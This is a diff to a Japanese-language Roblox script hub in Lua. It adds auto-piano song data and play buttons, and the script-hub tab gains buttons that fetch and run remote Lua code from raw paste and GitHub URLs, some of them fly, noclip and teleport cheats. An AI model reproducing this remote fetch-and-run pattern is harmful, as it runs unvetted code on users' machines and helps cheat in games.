+  {"key": "Key1C", "delay": 0.5},
+  {"key": "Key2E", "delay": 1},
+  {"key": "Key2E", "delay": 0.5},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2C", "delay": 0.25},
+  {"key": "Key2B", "delay": 0.25},
+  {"key": "Key2A", "delay": 0.25},
+  {"key": "Key2B", "delay": 0.25},
+  {"key": "Key2C", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.5},
+  {"key": "Key3A", "delay": 0.5},
+  {"key": "Key3A", "delay": 0.5},
+  {"key": "Key3B", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.5},
+  {"key": "Key2F", "delay": 0.5},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2C", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.5},
+  {"key": "Key2E", "delay": 0.5},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2B", "delay": 0.25},
+  {"key": "Key2A", "delay": 0.25},
+  {"key": "Key2C", "delay": 1.5},
+  {"key": "Key2D", "delay": 0.125},
+  {"key": "Key2E", "delay": 0.125},
+  {"key": "Key2F", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key2E", "delay": 1},
+  {"key": "Key3A", "delay": 1},
+  {"key": "Key2G", "delay": 0.5},
+  {"key": "Key2F", "delay": 1.5},
+  {"key": "Key2E", "delay": 0.5},
+  {"key": "Key2D", "delay": 0.5},
+  {"key": "Key2C", "delay": 0.5},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key3A", "delay": 2.25},
+  {"key": "Key2B", "delay": 0.5},
+  {"key": "Key2G", "delay": 0.5},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.75},
+  {"key": "Key3C", "delay": 0.5},
+  {"key": "Key2D", "delay": 0.5},
+  {"key": "Key3C", "delay": 0.5},
+  {"key": "Key3B", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.75},
+  {"key": "Key2F", "delay": 0.5},
+  {"key": "Key2D", "delay": 0.5},
+  {"key": "Key2E", "delay": 0.75},
+  {"key": "Key2Dsharp", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.5},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.5},
+  {"key": "Key2G", "delay": 0.5},
+  {"key": "Key2F", "delay": 0.5},
+  {"key": "Key3B", "delay": 0.5},
+  {"key": "Key3A", "delay": 0.5},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.5},
+  {"key": "Key2F", "delay": 0.5},
+  {"key": "Key2E", "delay": 0.5},
+  {"key": "Key2B", "delay": 0.5},
+  {"key": "Key2C", "delay": 0.5},
+  {"key": "Key2D", "delay": 0.5},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.75},
+  {"key": "Key3B", "delay": 0.5},
+  {"key": "Key3B", "delay": 0.5},
+  {"key": "Key3C", "delay": 0.5},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key3C", "delay": 4.25},
+  {"key": "Key3B", "delay": 0.5},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.5},
+  {"key": "Key2G", "delay": 0.5},
+  {"key": "Key2F", "delay": 0.5},
+  {"key": "Key3B", "delay": 0.5},
+  {"key": "Key3A", "delay": 0.5},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.5},
+  {"key": "Key2F", "delay": 0.5},
+  {"key": "Key2E", "delay": 0.5},
+  {"key": "Key2B", "delay": 0.5},
+  {"key": "Key2C", "delay": 0.5},
+  {"key": "Key2D", "delay": 0.5},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.75},
+  {"key": "Key3B", "delay": 0.5},
+  {"key": "Key3B", "delay": 0.5},
+  {"key": "Key3C", "delay": 0.5},
+  {"key": "Key3A", "delay": 0.25}
+]
+]]
+
+    -- ========================================================================
+    -- デフォルト曲：MONTAGEM_HIKARI
+    -- ========================================================================
+    local DEFAULT_SONG_MONTAGEM_HIKARI = [[
+[
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.75},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.75},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.5},
+  {"key": "Key2G", "delay": 0.5},
+  {"key": "Key2E", "delay": 0.5},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2C", "delay": 0.25},
+  {"key": "Key2C", "delay": 0.25},
+  {"key": "Key2C", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.5},
+  {"key": "Key2G", "delay": 1.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.5},
+  {"key": "Key3C", "delay": 0.5},
+  {"key": "Key3C", "delay": 0.5},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.75},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.5},
+  {"key": "Key2G", "delay": 0.5},
+  {"key": "Key2G", "delay": 0.5},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.5},
+  {"key": "Key3C", "delay": 0.5},
+  {"key": "Key3C", "delay": 0.5},
+  {"key": "Key2G", "delay": 0.5},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key2C", "delay": 0.5},
+  {"key": "Key2C", "delay": 0.25},
+  {"key": "Key2C", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2C", "delay": 0.25},
+  {"key": "Key2B", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.75},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.5},
+  {"key": "Key2D", "delay": 0.083333},
+  {"key": "Key2C", "delay": 0.083333},
+  {"key": "Key2C", "delay": 0.833333},
+  {"key": "Key2C", "delay": 0.25},
+  {"key": "Key2C", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.5},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2C", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2C", "delay": 0.25},
+  {"key": "Key2C", "delay": 0.5},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.75},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.75},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key2C", "delay": 0.5},
+  {"key": "Key2C", "delay": 0.25},
+  {"key": "Key2C", "delay": 0.25},
+  {"key": "Key2C", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.5},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2C", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.5},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.375},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.375},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.75},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.125},
+  {"key": "Key2D", "delay": 0.375},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key3C", "delay": 1},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.5},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.75},
+  {"key": "Key2F", "delay": 0.5},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.5},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.5},
+  {"key": "Key2G", "delay": 1.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.5},
+  {"key": "Key3C", "delay": 0.5},
+  {"key": "Key3C", "delay": 0.5},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.75},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.5},
+  {"key": "Key2G", "delay": 0.5},
+  {"key": "Key2G", "delay": 0.5},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.5},
+  {"key": "Key3C", "delay": 0.5},
+  {"key": "Key3C", "delay": 0.5},
+  {"key": "Key2G", "delay": 0.5},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.5},
+  {"key": "Key2G", "delay": 1.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.5},
+  {"key": "Key3C", "delay": 0.5},
+  {"key": "Key3C", "delay": 0.5},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.75},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.5},
+  {"key": "Key2G", "delay": 0.5},
+  {"key": "Key2G", "delay": 0.5},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.5},
+  {"key": "Key3C", "delay": 0.5},
+  {"key": "Key3C", "delay": 0.5},
+  {"key": "Key2G", "delay": 0.5},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25}
+]
+]]
+
+    -- ========================================================================
+    -- デフォルト曲セクション
+    -- ========================================================================
+    local DefaultSongSec = PianoTab:AddSection({ Name = "🎵 デフォルト曲" })
+
+    DefaultSongSec:AddLabel("曲を選択して演奏できます")
+
+    DefaultSongSec:AddButton({
+        Name = "▶ 少女A を演奏",
+        Callback = function()
+            if not SH.PianoConfig.Keyboard then
+                SH.PianoConfig.Keyboard = _G.getMusicKeyboard()
+            end
+            if not SH.PianoConfig.Keyboard then
+                PlayErrorSound()
+                OrionLib:MakeNotification({
+                    Name = "エラー",
+                    Content = "MusicKeyboardが見つかりません",
+                    Time = 5
+                })
+                return
+            end
+            PlayActionSound()
+            SH.PianoConfig.SongData = DEFAULT_SONG_SHOJO_A
+            _G.playSongFromJSONString(DEFAULT_SONG_SHOJO_A)
+            OrionLib:MakeNotification({
+                Name = "自動演奏",
+                Content = "少女A の演奏を開始しました",
+                Time = 3
+            })
+        end
+    })
+
+    DefaultSongSec:AddButton({
+        Name = "▶ 공격전이다 を演奏",
+        Callback = function()
+            if not SH.PianoConfig.Keyboard then
+                SH.PianoConfig.Keyboard = _G.getMusicKeyboard()
+            end
+            if not SH.PianoConfig.Keyboard then
+                PlayErrorSound()
+                OrionLib:MakeNotification({
+                    Name = "エラー",
+                    Content = "MusicKeyboardが見つかりません",
+                    Time = 5
+                })
+                return
+            end
+            PlayActionSound()
+            SH.PianoConfig.SongData = DEFAULT_SONG_GONGKYEOKJEON
+            _G.playSongFromJSONString(DEFAULT_SONG_GONGKYEOKJEON)
+            OrionLib:MakeNotification({
+                Name = "自動演奏",
+                Content = "공격전이다 の演奏を開始しました",
+                Time = 3
+            })
+        end
+    })
+
+    DefaultSongSec:AddButton({
+        Name = "▶ MONTAGEM_HIKARI を演奏",
+        Callback = function()
+            if not SH.PianoConfig.Keyboard then
+                SH.PianoConfig.Keyboard = _G.getMusicKeyboard()
+            end
+            if not SH.PianoConfig.Keyboard then
+                PlayErrorSound()
+                OrionLib:MakeNotification({
+                    Name = "エラー",
+                    Content = "MusicKeyboardが見つかりません",
+                    Time = 5
+                })
+                return
+            end
+            PlayActionSound()
+            SH.PianoConfig.SongData = DEFAULT_SONG_MONTAGEM_HIKARI
+            _G.playSongFromJSONString(DEFAULT_SONG_MONTAGEM_HIKARI)
+            OrionLib:MakeNotification({
+                Name = "自動演奏",
+                Content = "MONTAGEM_HIKARI の演奏を開始しました",
+                Time = 3
+            })
+        end
+    })
+
+    DefaultSongSec:AddButton({
+        Name = "⏹ 演奏を停止",
+        Callback = function()
+            _G.stopSong()
+            OrionLib:MakeNotification({
+                Name = "停止",
+                Content = "演奏を停止しました",
+                Time = 3
+            })
+        end
+    })
+
+    -- ========================================================================
+    -- 曲の再生（テキスト入力）
+    -- ========================================================================
     local PianoSongSec = PianoTab:AddSection({ Name = "曲の再生（テキスト入力）" })
     PianoSongSec:AddTextbox({ Name = "JSONデータを入力", Default = "", TextDisappear = false, Callback = function(text)
         if text and text ~= "" then SH.PianoConfig.SongData = text; OrionLib:MakeNotification({ Name = "読み込み完了", Content = "JSONテキストを設定しました", Time = 3 }) end
@@ -4890,6 +7065,9 @@ do
         OrionLib:MakeNotification({ Name = "停止", Content = "曲の再生を停止しました", Time = 3 })
     end })
 
+    -- ========================================================================
+    -- MIDI→JSON コンバーター
+    -- ========================================================================
     local ConverterSec = PianoTab:AddSection({ Name = "MIDI→JSON コンバーター" })
     ConverterSec:AddButton({ Name = "🌐 コンバーターを開く (ブラウザ)", Callback = function()
         PlayActionSound()
@@ -5331,10 +7509,12 @@ do
     end
 
     ScriptHubTab:AddButton({ Name = "シェーダー", Callback = function() executeScript("https://rawscripts.net/raw/Universal-Script-Shader-77482", "シェーダー") end })
+    ScriptHubTab:AddButton({ Name = "シェーダー2", Callback = function() executeScript("https://raw.githubusercontent.com/randomstring0/pshade-ultimate/refs/heads/main/src/cd.lua", "シェーダー2") end })
     ScriptHubTab:AddButton({ Name = "空変え", Callback = function() executeScript("https://rawscripts.net/raw/Universal-Script-SkyBoxinjectHUB-80671", "空変え") end })
     ScriptHubTab:AddButton({ Name = "テトリス", Callback = function() executeScript("https://rawscripts.net/raw/Universal-Script-RTetris-76191", "テトリス") end })
     ScriptHubTab:AddButton({ Name = "クロスケ作v式飛行", Callback = function() executeScript("https://rawscripts.net/raw/Universal-Script-VFly-gui-and-noclip-78112", "クロスケ作v式飛行") end })
     ScriptHubTab:AddButton({ Name = "HokutoHUB", Callback = function() executeScript("https://raw.githubusercontent.com/SaturnGroup02/Sakurahub-SabuHUB/06bb272eb235d0cee619c2d78355f62cdbe512da/HokutoHUB", "HokutoHUB") end })
+    ScriptHubTab:AddButton({ Name = "バックルームズ", Callback = function() executeScript("https://raw.githubusercontent.com/SaturnGroup02/Sakurahub-SabuHUB/refs/heads/main/Backrooms", "バックルームズ") end })
     ScriptHubTab:AddButton({ Name = "uiを日本語に翻訳", Callback = function() executeScript("https://pastefy.app/HCUekFMV/raw", "uiを日本語に翻訳") end })
     ScriptHubTab:AddButton({ Name = "FTAP TP", Callback = function() executeScript("https://pastefy.app/pAbXnxgr/raw", "FTAP TP") end })
 end
@@ -6101,12 +8281,13 @@ do
     task.wait(1)
     PlayActionSound()
     OrionLib:MakeNotification({
-        Name = "🌸さくらhubV0.7🌸起動完了",
+        Name = "🌸さくらhubV0.7[JP]🌸起動完了",
         Content = "v0.7.2.140",
         Image = "rbxassetid://4483362458",
         Time = 5
     })
     print("==========================================")
-    print("🌸さくらhubV0.7🌸 v0.7.2.140")
+    print("🌸さくらhubV0.7🌸 v0.7.2.140-JP")
+    print("© 2026/10/1 開発チーム[土星グループさくらhub部門")
     print("==========================================")
 end
